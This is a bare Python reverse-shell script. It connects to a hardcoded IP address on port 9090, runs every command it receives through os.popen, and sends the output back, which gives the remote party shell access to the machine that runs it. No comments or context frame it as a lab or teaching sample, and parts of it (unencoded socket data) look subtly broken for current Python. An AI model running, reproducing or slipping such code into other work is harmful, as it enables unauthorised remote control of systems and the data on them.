import socket,os

ip = "10.6.21.52"
port = 9090

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))

while True:
    cmd = s.recv(4096)
    for command in os.popen(cmd):
       s.send(command)
